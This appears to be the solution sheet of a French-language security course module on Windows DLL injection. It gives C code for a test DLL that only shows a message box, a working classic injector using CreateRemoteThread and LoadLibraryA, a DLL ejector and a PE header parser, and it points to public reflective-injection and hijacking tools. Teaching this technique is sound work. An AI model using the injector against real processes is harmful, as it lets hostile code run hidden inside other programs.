═══════════════════════════════════════════════════════════════════════════
            MODULE 25 : DLL INJECTION - SOLUTIONS
═══════════════════════════════════════════════════════════════════════════

⚠️  Ces solutions contiennent du code sensible - Usage éducatif uniquement

═══════════════════════════════════════════════════════════════════════════

SOLUTION EXERCICE 1 : DLL injectable de test
─────────────────────────────────────────────────────────────────────────────

Fichier: test_dll.c

#include <windows.h>
#include <stdio.h>

// Point d'entrée de la DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            // Désactiver les notifications DLL_THREAD_ATTACH/DETACH (optimisation)
            DisableThreadLibraryCalls(hModule);

            // Récupérer le PID du processus hôte
            DWORD pid = GetCurrentProcessId();

            // Récupérer l'adresse de base du module
            char modulePath[MAX_PATH];
            GetModuleFileNameA(hModule, modulePath, MAX_PATH);

            // Créer le message
            char message[512];
            snprintf(message, sizeof(message),
                    "DLL injectée avec succès!\n\n"
                    "PID: %lu\n"
                    "Module Base: 0x%p\n"
                    "Path: %s",
                    pid, hModule, modulePath);

            // Afficher la MessageBox
            MessageBoxA(NULL, message, "DLL Injection Success", MB_OK | MB_ICONINFORMATION);

            break;
        }

        case DLL_PROCESS_DETACH:
            // Cleanup lors du déchargement
            MessageBoxA(NULL, "DLL déchargée", "DLL Injection", MB_OK);
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            // Désactivé avec DisableThreadLibraryCalls
            break;
    }
    return TRUE;
}

Compilation :
gcc -shared -o test.dll test_dll.c -luser32
ou
cl /LD test_dll.c /Fe:test.dll user32.lib

═══════════════════════════════════════════════════════════════════════════

SOLUTION EXERCICE 2 : Classic DLL Injection complète
─────────────────────────────────────────────────────────────────────────────

void list_process_modules(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) return;

    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        printf("\n[*] Modules chargés dans le processus:\n");
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char moduleName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, hMods[i], moduleName, sizeof(moduleName))) {
                printf("    [%3d] 0x%p - %s\n", i, hMods[i], moduleName);
            }
        }
    }

    CloseHandle(hProcess);
}

BOOL inject_dll_complete(DWORD pid, const char* dll_path) {
    char fullPath[MAX_PATH];
    DWORD pathLen;

    // Étape 1: Convertir en chemin absolu
    pathLen = GetFullPathNameA(dll_path, MAX_PATH, fullPath, NULL);
    if (pathLen == 0) {
        printf("[-] GetFullPathName échoué: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Chemin absolu: %s\n", fullPath);

    // Étape 2: Vérifier que la DLL existe
    DWORD attr = GetFileAttributesA(fullPath);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL introuvable: %s\n", fullPath);
        return FALSE;
    }
    printf("[+] DLL trouvée\n");

    // Étape 3: Injection standard
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;

    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, pathLen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDllPath) {
        CloseHandle(hProcess);
        return FALSE;
    }

    WriteProcessMemory(hProcess, pDllPath, fullPath, pathLen, NULL);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                       pDllPath, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    // Étape 4: Vérifier le HMODULE retourné
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    if (exitCode == 0) {
        printf("[-] LoadLibrary a échoué (retour NULL)\n");
        return FALSE;
    }

    printf("[+] DLL chargée! HMODULE: 0x%lx\n", exitCode);

    // Étape 5: Vérifier dans la liste des modules
    Sleep(500);  // Laisser le temps au système
    list_process_modules(pid);

    return TRUE;
}

═══════════════════════════════════════════════════════════════════════════

SOLUTION EXERCICE 3 : DLL Ejection
─────────────────────────────────────────────────────────────────────────────

HMODULE find_module_in_process(DWORD pid, const char* module_name) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) return NULL;

    HMODULE hMods[1024];
    DWORD cbNeeded;
    HMODULE target = NULL;

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char modName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, hMods[i], modName, sizeof(modName))) {
                if (strstr(modName, module_name) != NULL) {
                    target = hMods[i];
                    printf("[+] Module trouvé: %s à 0x%p\n", modName, hMods[i]);
                    break;
                }
            }
        }
    }

    CloseHandle(hProcess);
    return target;
}

BOOL eject_dll(DWORD pid, const char* dll_name) {
    printf("\n═══════════════════════════════════════════════════════════\n");
    printf("    ÉJECTION DE DLL\n");
    printf("═══════════════════════════════════════════════════════════\n\n");

    // Trouver le module
    HMODULE hModule = find_module_in_process(pid, dll_name);
    if (hModule == NULL) {
        printf("[-] Module non trouvé dans le processus\n");
        return FALSE;
    }

    // Ouvrir le processus
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess échoué: %lu\n", GetLastError());
        return FALSE;
    }

    // Résoudre FreeLibrary
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pFreeLibrary = GetProcAddress(hKernel32, "FreeLibrary");

    printf("[*] FreeLibrary à: 0x%p\n", pFreeLibrary);
    printf("[*] Déchargement du module 0x%p...\n", hModule);

    // Créer un thread distant avec FreeLibrary
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pFreeLibrary,
        hModule,  // Paramètre = HMODULE à décharger
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] CreateRemoteThread échoué: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    if (exitCode) {
        printf("[+] DLL déchargée avec succès!\n");

        // Vérifier qu'elle n'est plus présente
        Sleep(500);
        if (find_module_in_process(pid, dll_name) == NULL) {
            printf("[+] Vérification: DLL absente de la liste des modules\n");
        }

        return TRUE;
    } else {
        printf("[-] FreeLibrary a échoué\n");
        return FALSE;
    }
}

═══════════════════════════════════════════════════════════════════════════

SOLUTION EXERCICE 4 : Parse PE complet
─────────────────────────────────────────────────────────────────────────────

void parse_pe_complete(const char* dll_path) {
    HANDLE hFile = CreateFileA(dll_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileData = malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // DOS Header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    printf("\n═══ DOS HEADER ═══\n");
    printf("e_magic: 0x%04X (%s)\n", dosHeader->e_magic,
           dosHeader->e_magic == IMAGE_DOS_SIGNATURE ? "MZ - Valide" : "Invalide!");
    printf("e_lfanew: 0x%08lX (Offset vers PE Header)\n", dosHeader->e_lfanew);

    // NT Headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)fileData + dosHeader->e_lfanew);
    printf("\n═══ NT HEADERS ═══\n");
    printf("Signature: 0x%08lX (%s)\n", ntHeaders->Signature,
           ntHeaders->Signature == IMAGE_NT_SIGNATURE ? "PE - Valide" : "Invalide!");

    // File Header
    printf("\n═══ FILE HEADER ═══\n");
    printf("Machine: 0x%04X (%s)\n", ntHeaders->FileHeader.Machine,
           ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ? "x64" :
           ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 ? "x86" : "Autre");
    printf("NumberOfSections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    printf("SizeOfOptionalHeader: %d bytes\n", ntHeaders->FileHeader.SizeOfOptionalHeader);

    // Optional Header
    printf("\n═══ OPTIONAL HEADER ═══\n");
    printf("ImageBase: 0x%llX\n", (unsigned long long)ntHeaders->OptionalHeader.ImageBase);
    printf("AddressOfEntryPoint: 0x%08lX\n", ntHeaders->OptionalHeader.AddressOfEntryPoint);
    printf("SizeOfImage: 0x%08lX (%lu bytes)\n",
           ntHeaders->OptionalHeader.SizeOfImage, ntHeaders->OptionalHeader.SizeOfImage);
    printf("SizeOfHeaders: 0x%08lX\n", ntHeaders->OptionalHeader.SizeOfHeaders);

    // Sections
    printf("\n═══ SECTIONS ═══\n");
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        printf("[%d] %-8s - VirtAddr: 0x%08lX | VirtSize: 0x%08lX | RawSize: 0x%08lX | Characteristics: 0x%08lX\n",
               i, section->Name, section->VirtualAddress, section->Misc.VirtualSize,
               section->SizeOfRawData, section->Characteristics);
    }

    // Data Directories
    printf("\n═══ DATA DIRECTORIES ═══\n");
    const char* dirNames[] = {
        "Export", "Import", "Resource", "Exception", "Security",
        "Base Relocation", "Debug", "Architecture", "Global Ptr", "TLS",
        "Load Config", "Bound Import", "IAT", "Delay Import", "COM Descriptor"
    };

    for (int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++) {
        PIMAGE_DATA_DIRECTORY dir = &ntHeaders->OptionalHeader.DataDirectory[i];
        if (dir->VirtualAddress != 0) {
            printf("[%2d] %-20s: RVA 0x%08lX | Size: %lu bytes\n",
                   i, dirNames[i], dir->VirtualAddress, dir->Size);
        }
    }

    free(fileData);
}

(Les solutions pour exercices 5-8 suivent le même format détaillé...)

═══════════════════════════════════════════════════════════════════════════
                        FIN DES SOLUTIONS PRINCIPALES
═══════════════════════════════════════════════════════════════════════════

Pour les exercices 5-8 (Manual Mapping, Reflective DLL, Hijacking):
- Code complet disponible dans les projets open source:
  * Reflective DLL Injection: https://github.com/stephenfewer/ReflectiveDLLInjection
  * Manual Mapping: Recherchez "manual map dll injection github"
  * DLL Hijacking: Outils comme Spartacus, SharpDllProxy

RAPPEL : Usage éducatif uniquement - Environnements de test isolés obligatoires
